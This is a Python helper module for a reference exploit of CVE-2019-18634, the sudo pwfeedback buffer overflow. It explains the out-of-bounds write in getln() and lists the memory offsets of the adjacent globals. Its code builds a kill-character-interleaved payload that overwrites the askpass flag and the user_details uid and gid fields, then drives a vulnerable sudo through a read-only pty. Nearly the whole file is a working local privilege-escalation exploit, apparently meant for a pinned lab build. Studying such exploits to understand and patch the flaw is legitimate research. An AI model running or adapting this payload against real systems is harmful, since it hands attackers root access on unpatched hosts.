#!/usr/bin/env python3
"""
Shared helpers for the CVE-2019-18634 (sudo pwfeedback) reference exploit.

The vulnerability is a forward out-of-bounds write in getln() (src/tgetpass.c):
when the terminal *kill* character is received and the feedback write() fails,
the code resets `left` to the buffer size but does NOT reset the `cp` cursor,
so every subsequent character is written past the end of the static buffer.

The privileged globals that follow the buffer in the vulnerable build are:

    buf.6 (0x232e0)  [256 bytes]   <- the buffer passed to getln() by tgetpass()
    askpass.7        [+256]        <- cached SUDO_ASKPASS path pointer
    signo            [+288]        <- signal bookkeeping array
    tgetpass_flags   [+548]        <- we set TGP_ASKPASS (0x04)
    user_details     [+576]        <- we overwrite uid/euid/gid/egid

Writing one byte per read is done by emitting the data byte followed by the
kill character (0x15 on a default pty), which resets `left` without moving
`cp`, allowing an unbounded linear write.
"""

import os
import pty
import select
import struct
import subprocess
import termios
import time

# Offsets measured from the vulnerable `buf` symbol for the pinned build
# (Ubuntu 22.04, sudo 1.8.25, CC=gcc with -fcommon).  See README.md.
OFF_TGETPASS_FLAGS = 548
OFF_USER_DETAILS = 576

# struct user_details field offsets (linux x86_64)
UD_UID = 20
UD_EUID = 24
UD_GID = 28
UD_EGID = 32

TGP_ASKPASS = 0x04

# Write through egid; leave the rest of user_details (pointers etc.) intact.
WRITE_LEN = OFF_USER_DETAILS + UD_EGID + 4

KILL_CHAR = 0x15
SPECIAL = (0x0A, 0x0D, KILL_CHAR)


def build_payload(uid, gid):
    """Build the raw byte stream that creates the overflow."""
    buf = bytearray(WRITE_LEN)
    buf[OFF_TGETPASS_FLAGS:OFF_TGETPASS_FLAGS + 4] = struct.pack("<I", TGP_ASKPASS)

    def put32(off, val):
        buf[off:off + 4] = struct.pack("<I", val & 0xFFFFFFFF)

    put32(OFF_USER_DETAILS + UD_UID, uid)
    put32(OFF_USER_DETAILS + UD_EUID, uid)
    put32(OFF_USER_DETAILS + UD_GID, gid)
    put32(OFF_USER_DETAILS + UD_EGID, gid)

    for b in buf:
        if b in SPECIAL:
            raise ValueError("payload byte 0x%02x collides with a terminal special char" % b)

    out = bytearray()
    for b in buf:
        out.append(b)
        out.append(KILL_CHAR)
    out.append(0x0A)  # terminate getln()
    return bytes(out)


def make_raw(fd):
    """
    Disable line-discipline processing on a tty.  This matters because the
    payload contains NULs, kill characters and (for non-zero uids) bytes such
    as 0x03 that would otherwise be interpreted by the kernel as flow control
    or signals (sudo's cbreak mode re-enables ISIG, so call this again right
    before feeding the payload).
    """
    try:
        attrs = termios.tcgetattr(fd)
        attrs[0] &= ~(termios.BRKINT | termios.ICRNL | termios.INLCR |
                      termios.IGNCR | termios.IXON | termios.IXOFF | termios.ISTRIP)
        attrs[3] &= ~(termios.ECHO | termios.ECHONL | termios.ICANON |
                      termios.IEXTEN | termios.ISIG)
        for cc in (termios.VINTR, termios.VQUIT, termios.VSUSP):
            attrs[6][cc] = b"\x00"
        termios.tcsetattr(fd, termios.TCSANOW, attrs)
    except (termios.error, AttributeError):
        pass


def spawn_vulnerable_sudo(sudo_path, helper_path, extra_args=("-S", "-k", "id")):
    """
    Start the vulnerable sudo with its stdin bound to the read-only slave end
    of a pty.  Writing to a read-only fd fails, which is the condition needed
    to trigger the bug once the kill character is processed.
    Returns (proc, master_fd, slave_fd, slave_path, ro_fd).
    """
    master_fd, slave_fd = pty.openpty()
    make_raw(slave_fd)
    slave_path = os.ttyname(slave_fd)
    # O_NOCTTY: do not let this pty become our controlling terminal, otherwise
    # closing it delivers SIGHUP to the calling process/session.
    ro_fd = os.open(slave_path, os.O_RDONLY | os.O_NOCTTY)

    env = dict(os.environ)
    env["SUDO_ASKPASS"] = helper_path

    proc = subprocess.Popen(
        [sudo_path, *extra_args],
        stdin=ro_fd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
        close_fds=True,
    )
    return proc, master_fd, slave_fd, slave_path, ro_fd


def write_all(fd, data):
    """os.write() may perform a short write on a pty; loop until done."""
    view = memoryview(data)
    while view:
        n = os.write(fd, view)
        view = view[n:]


def wait_for_prompt(proc, timeout=10.0):
    """
    Consume stdout/stderr until sudo writes its password prompt.  The prompt
    is emitted after sudo_term_cbreak() has initialised sudo_term_kill, so
    synchronising on it removes a race in which the payload is written before
    the kill character is known.  Returns the bytes consumed.
    """
    deadline = time.time() + timeout
    buf = b""
    while time.time() < deadline:
        ready, _, _ = select.select([proc.stdout], [], [], 0.1)
        if ready:
            chunk = os.read(proc.stdout.fileno(), 4096)
            if not chunk:
                break
            buf += chunk
            if b"Password" in buf or b"password for" in buf:
                break
    return buf


def run_exploit(sudo_path, helper_path, uid, gid, extra_args=("-S", "-k", "id"), timeout=20):
    """Drive the full exploit and return (returncode, output)."""
    proc, master_fd, slave_fd, _slave_path, ro_fd = spawn_vulnerable_sudo(
        sudo_path, helper_path, extra_args
    )
    try:
        pre = wait_for_prompt(proc)
        make_raw(slave_fd)  # undo sudo's cbreak re-enabling of ISIG
        write_all(master_fd, build_payload(uid, gid))
        try:
            out, _ = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    finally:
        for fd in (ro_fd, master_fd, slave_fd):
            try:
                os.close(fd)
            except OSError:
                pass
    return proc.returncode, pre + out
